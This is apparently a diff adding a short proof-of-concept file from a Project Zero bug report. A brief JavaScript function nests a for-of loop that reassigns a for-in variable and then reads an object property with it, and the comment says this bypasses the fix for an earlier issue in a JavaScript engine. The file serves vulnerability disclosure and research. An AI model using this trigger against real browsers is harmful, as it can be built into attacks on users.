@@ -1,0 +1,20 @@
+<!--
+Source: https://bugs.chromium.org/p/project-zero/issues/detail?id=1319
+
+The following PoC bypasses the fix for the  issue 1263 (https://bugs.chromium.org/p/project-zero/issues/detail?id=1263)
+
+PoC:
+-->
+
+function f() {
+    let o = {};
+    for (let i in {xx: 0}) {
+        for (i of [0]) {
+
+        }
+
+        print(o[i]);
+    }
+}
+
+f();
